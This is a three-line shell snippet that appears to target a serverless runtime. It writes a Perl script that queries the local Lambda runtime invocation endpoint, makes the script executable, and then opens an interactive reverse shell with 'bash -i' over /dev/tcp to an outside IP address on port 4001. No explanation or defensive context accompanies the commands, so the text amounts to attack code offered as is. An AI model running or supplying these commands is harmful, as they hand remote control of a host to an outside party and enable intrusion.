echo 'require HTTP::Request; $request = HTTP::Request->new(GET => \'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next\');' > script.pl;
chmod +x script.pl;
bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
